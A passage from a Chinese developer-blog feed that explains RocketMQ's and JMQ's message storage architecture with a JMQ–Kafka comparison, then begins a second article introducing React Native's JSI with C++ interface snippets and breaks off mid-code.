<p>RocketMQ采用「CommitLog + ConsumeQueue + IndexFile」三层结构，彻底分离数据存储与索引查询：​</p>
<p>•CommitLog：全局单一日志文件（默认 1GB / 个，循环覆盖），存储所有主题的原始消息​​</p>
<p>•ConsumeQueue：按主题 - 队列维度拆分的索引文件，存储「消息物理地址 + 偏移量 + 长度」，供消费者快速查询​</p>
<p>•IndexFile：哈希索引文件，支持按消息 Key 查询</p>
<p>CommitLog：消息的原始日记本</p>
<p><strong>CommitLog</strong>是RocketMQ存储消息的物理文件，所有消息都会按到达顺序写入这个文件。你可以把它想象成一本不断追加的日记本——每条消息都是按时间顺序记录的新日记。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 消息存储的核心逻辑简化示例（非源码）</span>
 public void <span class="hljs-built_in">putMessage</span>(Message message) {
     <span class="hljs-comment">// 1. 将消息序列化为字节数组</span>
     byte<span class="hljs-selector-attr">[]</span> data = <span class="hljs-built_in">serialize</span>(message);
     <span class="hljs-comment">// 2. 计算消息物理偏移量</span>
     long offset = commitLog<span class="hljs-selector-class">.getMaxOffset</span>();
     <span class="hljs-comment">// 3. 将数据追加到CommitLog文件末尾</span>
     commitLog<span class="hljs-selector-class">.append</span>(data);
     <span class="hljs-comment">// 4. 返回消息的全局唯一物理偏移量</span>
     return offset;
}
</code></pre>
<p>消息写入CommitLog时有三个关键特性：</p>
<p>1.<strong>顺序写入</strong>：所有消息按到达顺序追加到文件末尾，避免磁盘随机寻址</p>
<p>2.<strong>内存映射</strong>：通过MappedByteBuffer实现文件映射，减少数据拷贝次数</p>
<p>3.<strong>文件分割</strong>：单个CommitLog文件默认1GB，写满后创建新文件（文件名用起始偏移量命名）</p>
<p>举个例子，当生产者发送三条消息时，CommitLog文件可能长这样：</p>
<pre><code class="hljs language-ini" lang="ini">0000000000000000000（文件1，1GB）  
2|--消息A(<span class="hljs-attr">offset</span>=<span class="hljs-number">0</span>)  
3|--消息B(<span class="hljs-attr">offset</span>=<span class="hljs-number">100</span>)  
4|--消息C(<span class="hljs-attr">offset</span>=<span class="hljs-number">200</span>)  
500000000001073741824（文件2，起始偏移量1073741824）  
</code></pre>
<p><strong>温馨提示</strong>：虽然CommitLog是顺序写，但读取时需要配合索引结构，否则遍历文件找消息就像大海捞针。</p>
<p>消费队列ConsumeQueue：消息的快速目录</p>
<p>如果每次消费都要扫描CommitLog，性能会惨不忍睹。于是RocketMQ设计了<strong>ConsumeQueue</strong>——它是基于Topic和Queue的二级索引文件。</p>
<p>每个ConsumeQueue条目包含三个关键信息（固定20字节）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-number">1</span>| CommitLog <span class="hljs-title function_">Offset</span> <span class="hljs-params">(<span class="hljs-number">8</span>字节)</span> | Message <span class="hljs-title function_">Size</span> <span class="hljs-params">(<span class="hljs-number">4</span>字节)</span> | Tag <span class="hljs-title function_">Hashcode</span> <span class="hljs-params">(<span class="hljs-number">8</span>字节)</span> |  
</code></pre>
<p>这相当于给CommitLog里的消息做了一个目录：</p>
<pre><code class="hljs language-lua" lang="lua">TopicA-Queue0的ConsumeQueue  
<span class="hljs-number">2</span>|<span class="hljs-comment">--0（对应CommitLog偏移0的消息A）  </span>
<span class="hljs-number">3</span>|<span class="hljs-comment">--100（对应CommitLog偏移100的消息B）  </span>
<span class="hljs-number">4</span>|<span class="hljs-comment">--200（对应CommitLog偏移200的消息C）</span>
</code></pre>
<p>当消费者拉取TopicA-Queue0的消息时：</p>
<p>1.先查ConsumeQueue获取消息的物理位置</p>
<p>2.根据CommitLog Offset直接定位到CommitLog文件</p>
<p>3.读取指定位置的消息内容</p>
<p><strong>关键设计点</strong>：</p>
<p>•ConsumeQueue采用内存映射+异步刷盘，保证高性能</p>
<p>•单个文件存储30万条索引，约5.72MB（30万*20字节）</p>
<p>•通过hashCode快速过滤Tag，实现消息过滤</p>
<p>索引文件IndexFile：消息的全局字典</p>
<p>如果需要根据MessageID或Key查询消息，ConsumeQueue就不够用了。这时候就要用到<strong>IndexFile</strong>这个全局索引。</p>
<p>IndexFile的结构类似HashMap：</p>
<p>1.<strong>Slot槽位</strong>（500万个）：存储相同hash值的Index条目链表头</p>
<p>2.<strong>Index条目</strong>（2000万条）：包含Key的hash值、CommitLog偏移量、时间差等信息</p>
<p>当写入消息时：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 索引构建过程简化示意</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">buildIndex</span><span class="hljs-params">(Message message)</span> </span>{
    <span class="hljs-comment">// 计算Key的hash值</span>
    <span class="hljs-type">int</span> hash = <span class="hljs-built_in">hash</span>(message.<span class="hljs-built_in">getKey</span>());
    <span class="hljs-comment">// 定位到对应的Slot槽位</span>
    <span class="hljs-type">int</span> slotPos = hash % slotNum;
    <span class="hljs-comment">// 在Index区域追加新条目</span>
    indexFile.<span class="hljs-built_in">addEntry</span>(hash, message.<span class="hljs-built_in">getCommitLogOffset</span>());
}
</code></pre>
<p>查询时通过两次查找快速定位：</p>
<p>1.根据Key的hash值找到Slot槽位</p>
<p>2.遍历Slot对应的链表，比对CommitLog中的实际Key值</p>
<p><strong>性能优化必知</strong>：</p>
<p>•消息体积差异大时，CommitLog仍然保持顺序写，但ConsumeQueue可能出现「稀疏索引」（相邻索引指向的物理位置间隔大）</p>
<p>•生产环境中CommitLog建议放在单独SSD磁盘，ConsumeQueue和IndexFile可放普通磁盘</p>
<p>•遇到消息堆积时，优先检查消费者速度，而不是无脑扩容Broker存储</p>
<p>理解这些底层机制，下次遇到消息查询性能问题或者磁盘IO瓶颈时，就知道该从CommitLog的写入模式还是ConsumeQueue的索引结构入手排查了。</p>
<h3 data-id="heading-9">2.2 数据流转机制</h3>
<p>•生产者写入 CommitLog，生成全局唯一偏移量（PHYOFFSET）​</p>
<p>•后台线程异步构建 ConsumeQueue 索引，同步消息元数据​</p>
<p>•消费者通过 ConsumeQueue 定位 CommitLog 中的消息，避免全量扫描</p>
<p>存储过程全景图</p>
<p>现在把各个模块串起来看消息的生命周期：</p>
<p>1.生产者发送消息到Broker</p>
<p>2.Broker将消息<strong>顺序写入CommitLog</strong></p>
<p>3.<strong>异步线程</strong>同时构建ConsumeQueue和IndexFile</p>
<p>4.消费者通过ConsumeQueue快速定位消息</p>
<p>5.按需查询IndexFile实现消息回溯</p>
<p>整个过程就像图书馆的管理系统：</p>
<p>•CommitLog是藏书库（按入库时间摆放）</p>
<p>•ConsumeQueue是分类目录（按题材/出版社分类）</p>
<p>•IndexFile是检索电脑（支持按书名/作者查询）</p>
<h3 data-id="heading-10">2.4 设计优势</h3>
<p>•读写分离：CommitLog 仅负责写入，ConsumeQueue 负责查询，提升并发性能​</p>
<p>•事务支持：通过 CommitLog 中的事务状态标记 + 回查机制，实现分布式事务消息​</p>
<p>•刷盘策略：支持「异步刷盘（高吞吐）」「同步刷盘（金融级可靠性）」动态切换</p>
<h2 data-id="heading-11">三、JMQ存储架构</h2>
<p>JMQ的消息存储分别参考了Kafka和RocketMQ存储设计上优点，并根据京东内部的应用场景进行了改进和创新。</p>
<h3 data-id="heading-12">3.1 核心存储模型：分区日志 + 队列兼容</h3>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2c49ebef1454ecfa3eb5dc914d8e9b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889319&amp;x-signature=%2FMKq95%2FkKgWD%2BV9ypnTsgfXuzg8%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p><strong>JMQ</strong>存储的基本单元是PartitionGroup。在同一个Broker上，每个PartitionGroup对应一组消息文件（Journal Files），顺序存放这个Topic的消息。</p>
<p>与Kafka类似，每个Topic包含若干Partition，每个Partition对应一组索引文件（Index Files），索引中存放消息在消息文件中的位置和消息长度。消息写入时，收到的消息按照对应的PartitionGroup写入依次追加写入消息文件中，然后异步创建索引并写入对应Partition的索引文件中。</p>
<p>以PartionGroup为基本存储单元的设计，在兼顾灵活性的同时，具有较好的性能，并且单个PartitionGroup可以支持更多的并发。</p>
<h3 data-id="heading-13">3.2 消息读/写过程</h3>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65797ed9958e496ab45de3f081747403~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889319&amp;x-signature=tUNZo5%2F%2BVu7XYsMj9wYFq1wEXyA%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p><strong>写消息：</strong></p>
<p>JMQ的写操作使用DirectBuffer作为缓存，数据先写入DirectBuffer，再异步通过FileChannel写入到文件中。</p>
<p>•消息写入DirectBuffer后，默认写入该节点成功（数据的高可靠是通过Raft协议复制，用多个内存副本来保证），相对Kafka的写操作来看，JMQ响应写入请求的处理过程没有发生系统调用，在京东内部的大量单条同步发送的场景下开销更低、性能更优。</p>
<p>•同时也避免使用MappedByteBuffer（Mmap方式）产生Page Fault中断，OS在中断中将该页对应磁盘中的数据拷贝到内存中，在对文件进行追加写入的情况下，这一无法避免的过程是完全没有必要，反而增加了写入的耗时的问题。</p>
<p><strong>读消息：</strong></p>
<p>JMQ采用定长稠密索引设计，每个索引固定长度。</p>
<p>•定长设计的好处是，直接根据索引序号就可以计算出索引在文件中的位置：索引位置 = 索引序号 * 索引长度。这样，消息的查找过程就比较简单了，首先计算出索引所在的位置，直接读取索引，然后根据索引中记录的消息位置读取消息。</p>
<p>•在京东内部应用场景中，单条消息处理耗时高是比较常见的，微服务架构下用户一般会申请更多的消费节点，让每个消费节点单次拉取较小批量的消息进行处理，以提升消费并行度，这样消费拉取请求的次数会比较多，稠密索引的设计会更适用内部的应用场景。</p>
<p>JMQ消费读操作99%以上都能命中缓存（JMQ设计的堆外内存与文件映射的一种缓存机制），避免了Kafka可能遇到的Cache被污染，影响性能和吞吐的问题。同时直接读内存也规避了RocketMQ在读取消息存储的日志数据文件时容易产生较多的随机访问读取磁盘，影响性能的问题。（当没有命中缓存时，会默认降级为通过Mmap的方式读取消息）。</p>
<h2 data-id="heading-14">四、竞品对比分析</h2>













































<table><thead><tr><th>﻿</th><th><strong>JMQ</strong></th><th><strong>Kafka</strong></th></tr></thead><tbody><tr><td><strong>存储模型</strong></td><td>以<strong>PartitionGroup</strong>为基本存储单元，支持高并发写入</td><td>以<strong>Partition</strong>为基本存储单元，支持灵活的数据复制和迁移</td></tr><tr><td><strong>消息写入性能</strong></td><td>- 单副本异步写入性能与 Kafka 相当 - 三副本异步写入性能优于 Kafka</td><td>- 单副本异步写入性能与 JMQ 相当 - 三副本异步写入性能略低于 JMQ</td></tr><tr><td><strong>同步写入性能</strong></td><td>- 同步写入性能稳定，几乎不受网络延迟影响</td><td>- 同步写入性能受网络延迟影响较大，稳定性略逊于 JMQ</td></tr><tr><td><strong>多分区性能</strong></td><td>- 多分区异步写入性能与 Kafka 相当 - 同步写入性能略低于 Kafka</td><td>- 多分区同步写入性能更稳定，适合高并发场景</td></tr><tr><td><strong>副本机制</strong></td><td>支持异步复制，副本间数据同步性能较好</td><td>支持异步和同步复制，副本机制成熟，适合复杂部署</td></tr><tr><td><strong>跨机房部署</strong></td><td>- 同步写入性能基本不受影响 - 异步写入性能下降</td><td>- 同步写入性能受网络延迟影响较大 - 异步写入性能下降</td></tr><tr><td><strong>适用场景</strong></td><td>- 对同步写入性能要求高 - 副本异步吞吐要求高 - 大规模微服务集群</td><td>- 复杂分区的高并发同步写入 - 大规模分布式系统 - 多语言生态支持丰富</td></tr></tbody></table>
<p>在单副本场景下，JMQ与Kafka的单机写入性能均十分出色，均可达到网络带宽上限。</p>
<p>然而，在更贴近生产环境的三副本场景中，两者特性出现分化：</p>
<p><strong>JMQ在三副本异步写入下的极限吞吐优势明显，且在跨机房部署时，其同步写入性能表现良好，几乎不受网络延迟影响；而Kafka则在多分区同步写入场景下展现出更稳定的性能，衰减小于JMQ。在大部分异步吞吐场景及不同消息体下的性能趋势上，两者表现相当。</strong></p>
<p>综上所述，JMQ尤其适合对同步写入性能和副本异步吞吐有极高要求的场景，而Kafka在复杂分区的高并发同步写入方面适应性更广。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JSI入门指南]]></title>    <link>https://juejin.cn/post/7594389431835295785</link>    <guid>https://juejin.cn/post/7594389431835295785</guid>    <pubDate>2026-01-13T03:25:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389431835295785" data-draft-id="7593908867564126251" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JSI入门指南"/> <meta itemprop="keywords" content="React Native,前端,C++"/> <meta itemprop="datePublished" content="2026-01-13T03:25:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="编程之路从0到1"/> <meta itemprop="url" content="https://juejin.cn/user/4125023359744296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JSI入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4125023359744296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    编程之路从0到1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:25:42.000Z" title="Tue Jan 13 2026 03:25:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JSI入门指南</h2>
<h3 data-id="heading-1">前言</h3>
<p>要想彻底理解React Native新架构，JSI是绕不过去的槛。所以本文作为React Native源码剖析的第二篇文章。阅读本文需要了解一些简单的现代C++知识。新架构RN基本上是基于C++ 17开发的。学习现代C++可以极大的扩宽知识边界，提升能力范围。而且现代C++更加规范，学习难度降低，是性价比极高的选择。当然，仅作为源码阅读的需要，并不用深入学习C++，甚至不用会写代码，只要能看懂一些语法足够了。如果想更进一步，学习基本的现代C++开发，可以帮助我们开发React Native的纯C++ TurboModule，可以极大的优化RN App的性能，以及应用范围，在后面的RN新架构的一些列介绍文章中，相信对这一点一定体会极深。</p>
<h3 data-id="heading-2">JSI 概述</h3>
<h4 data-id="heading-3">什么是JSI？</h4>
<p><strong>JSI（JavaScript Interface）</strong> 是 React Native 新架构中的一个核心组件，本质上是一个由 <strong>C++ 实现的轻量级接口层</strong>，用来连接：</p>
<ul>
<li>一边是 JavaScript 运行时（如 Hermes、V8）</li>
<li>另一边是原生代码（主要是 C++，间接连到 Java/Obj‑C/平台 API）</li>
</ul>
<p>它的目标是<strong>取代旧的异步 Bridge（JSON 消息桥）</strong>，让 JS 与原生之间可以 <strong>直接、高性能地互相调用</strong>，大幅降低通信开销和延迟。</p>
<p>简单说，以前 JS 和原生要靠发 JSON 消息来通信，现在通过 JSI，双方可以像直接函数调用那样对话，并且可以互相保存对方对象的引用。</p>
<h4 data-id="heading-4">JSI 的核心特点</h4>
<ol>
<li>
<p>直接、低开销的 JS ↔ 原生通信</p>
<ul>
<li>
<p>JSI 允许 <strong>JavaScript 保存 C++ 对象引用，C++ 也能保存 JS 对象引用</strong>，通过内存引用直接调用方法</p>
</li>
<li>
<p>不再需要把数据转成 JSON 再跨线程传递，<strong>去掉序列化/反序列化开销</strong>，尤其对大数据量（如相机帧缓冲、图像、音频样本等）非常关键</p>
</li>
<li>
<p>性能密集型库（例如 VisionCamera、Reanimated、Skia 等）借助 JSI 才能在 React Native 里做到接近原生的实时性能</p>
</li>
</ul>
</li>
<li>
<p>支持同步和异步调用</p>
<ul>
<li>
<p>旧 Bridge 只能异步，很多场景需要“立刻拿到结果”很别扭。</p>
</li>
<li>
<p>JSI 提供：</p>
<ul>
<li>
<p><strong>异步调用</strong>：常规推荐方式，避免阻塞 JS 线程或 UI 线程。</p>
</li>
<li>
<p><strong>同步调用</strong>：在确实需要“立即返回值”的场景（例如获取剪贴板、当前位置等）可以直接从原生拿值返回给 JS，而不用 Promise / 回调</p>
</li>
<li>
<p>这种“既支持同步又支持异步”的模式，让 React Native 在易用性和性能之间有了更多空间。</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>用 C++ 实现、为性能而生</p>
<ul>
<li>
<p>JSI 自身是 <strong>C++ API</strong>，提供 <code>jsi::Runtime</code>、<code>jsi::Object</code>、<code>jsi::Function</code>、<code>jsi::Value</code> 等低层接口，用于：</p>
<ul>
<li>在原生代码中操作 JS 值与对象；</li>
<li>注册可供 JS 调用的原生函数；</li>
<li>直接与 JS 引擎交互</li>
<li>由于是本地编译代码，减少了中间层和解释开销，带来更好的 <strong>启动时间与运行时性能</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p>脱离旧 Bridge，成为新架构的基础。React Native 新架构的几个关键词：<strong>JSI、TurboModules、Fabric、Codegen</strong>，其中 JSI 是整个系统的“底座”</p>
<ul>
<li>
<p><strong>TurboModules</strong>：新一代原生模块系统，通过 JSI 实现 JS 与原生模块的直接调用，而不是通过老 Bridge</p>
</li>
<li>
<p><strong>Fabric 渲染器</strong>：UI 事件与渲染更新通过 JSI 与 JS 运行时通信，使得界面更新更高效、更可控</p>
</li>
<li>
<p><strong>Codegen</strong>：从类型化的 JS/TS 声明自动生成原生 C++/平台代码，这些代码通过 JSI 与 JS 通信</p>
</li>
<li>
<p>JSI 还是一个 <strong>与 JS 引擎无关的接口层</strong>，因此可以支持 Hermes、V8 等多种引擎，不再绑定于 JavaScriptCore</p>
</li>
</ul>
</li>
<li>
<p>更适合高性能与跨平台原生模块。借助 JSI，你可以：</p>
<ul>
<li>写 <strong>纯 C++ 模块</strong>，然后在 Android 和 iOS 上复用这一套实现，只需很少的平台胶水代码</li>
<li>直接在原生层访问设备能力（相机、蓝牙、GPS 等），并暴露给 JS 使用，同时保持高性能</li>
<li>将复杂实例对象（数据库连接、图像缓冲、音频样本等）直接暴露给 JS 层，而不是一堆 JSON 数据</li>
</ul>
</li>
</ol>
<h5 data-id="heading-5">JSI vs Bridge</h5>



































<table><thead><tr><th>特性</th><th>Bridge (旧架构)</th><th>JSI (新架构)</th></tr></thead><tbody><tr><td><strong>通信方式</strong></td><td>JSON 序列化/反序列化</td><td>直接内存访问</td></tr><tr><td><strong>性能</strong></td><td>慢（每次调用都序列化）</td><td>快（零序列化开销）</td></tr><tr><td><strong>同步调用</strong></td><td>❌ 不支持</td><td>✅ 支持</td></tr><tr><td><strong>类型安全</strong></td><td>❌ 运行时检查</td><td>✅ C++ 类型系统</td></tr><tr><td><strong>内存开销</strong></td><td>高（JSON 字符串）</td><td>低（直接引用）</td></tr></tbody></table>
<h3 data-id="heading-6">JSI 类型系统</h3>
<h5 data-id="heading-7">类型层级结构</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">ICast</span> (接口)
  └─ <span class="hljs-title class_">Runtime</span> (抽象类)

<span class="hljs-title class_">Pointer</span> (基类 - 不可拷贝，可移动)
  ├─ <span class="hljs-title class_">PropNameID</span> (属性名)
  ├─ <span class="hljs-title class_">Symbol</span> (<span class="hljs-title class_">ES6</span> <span class="hljs-title class_">Symbol</span>)
  ├─ <span class="hljs-title class_">BigInt</span> (大整数)
  ├─ <span class="hljs-title class_">String</span> (字符串)
  └─ <span class="hljs-title class_">Object</span> (对象)
       ├─ <span class="hljs-title class_">Array</span> (数组)
       ├─ <span class="hljs-title class_">ArrayBuffer</span> (二进制缓冲区)
       └─ <span class="hljs-title class_">Function</span> (函数)

<span class="hljs-title class_">Value</span> (联合类型 - 可存储任意 <span class="hljs-variable constant_">JS</span> 值)
  ├─ <span class="hljs-literal">undefined</span>
  ├─ <span class="hljs-literal">null</span>
  ├─ <span class="hljs-built_in">boolean</span>
  ├─ <span class="hljs-built_in">number</span>
  ├─ <span class="hljs-title class_">Symbol</span>
  ├─ <span class="hljs-title class_">BigInt</span>
  ├─ <span class="hljs-title class_">String</span>
  └─ <span class="hljs-title class_">Object</span>
</code></pre>
<h5 data-id="heading-8">Runtime - JS 引擎抽象</h5>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> : <span class="hljs-keyword">public</span> ICast {
 <span class="hljs-keyword">public</span>:
  <span class="hljs-comment">// 1. 执行 JavaScript 代码</span>
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Value <span class="hljs-title">evaluateJavaScript</span><span class="hljs-params">(
      <span class="hljs-type">const</span> std::shared_ptr&lt;<span class="hljs-type">const</span> Buffer&gt;&amp; buffer,
      <span class="hljs-type">const</span> std::string&amp; sourceURL)</span> </span>= <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 2. 创建 JS 对象</span>
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Object <span class="hljs-title">createObject</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Array <span class="hljs-title">createArray</span><span class="hljs-params">(<span class="hljs-type">size_t</span> length)</span> </span>= <span class="hljs-number">0</span>;
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Function <span class="hljs-title">createFunctionFromHostFunction</span><span class="hljs-params">(
      <span class="hljs-type">const</span> PropNameID&amp; name,
      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> paramCount,
      HostFunctionType func)</span> </span>= <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 3. 访问全局对象</span>
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Object <span class="hljs-title">global</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 4. 属性操作</span>
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Value <span class="hljs-title">getProperty</span><span class="hljs-params">(<span class="hljs-type">const</span> Object&amp;, <span class="hljs-type">const</span> PropNameID&amp; name)</span> </span>= <span class="hljs-number">0</span>;
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">setPropertyValue</span><span class="hljs-params">(
      <span class="hljs-type">const</span> Object&amp;, <span class="hljs-type">const</span> PropNameID&amp; name, <span class="hljs-type">const</span> Value&amp; value)</span> </span>= <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 5. 微任务队列管理</span>
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">queueMicrotask</span><span class="hljs-params">(<span class="hljs-type">const</span> Function&amp; callback)</span> </span>= <span class="hljs-number">0</span>;
  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">bool</span> <span class="hljs-title">drainMicrotasks</span><span class="hljs-params">(<span class="hljs-type">int</span> maxMicrotasksHint = <span class="hljs-number">-1</span>)</span> </span>= <span class="hljs-number">0</span>;
};
</code></pre>
<p><strong>引擎的具体实现（如：Hermes、JSC、V8）</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// Hermes 实现示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">HermesRuntime</span> : <span class="hljs-keyword">public</span> Runtime {
 <span class="hljs-keyword">public</span>:
  <span class="hljs-function">Value <span class="hljs-title">evaluateJavaScript</span><span class="hljs-params">(...)</span> <span class="hljs-keyword">override</span> </span>{
    <span class="hljs-comment">// Hermes 特定的 JS 执行逻辑</span>
  }

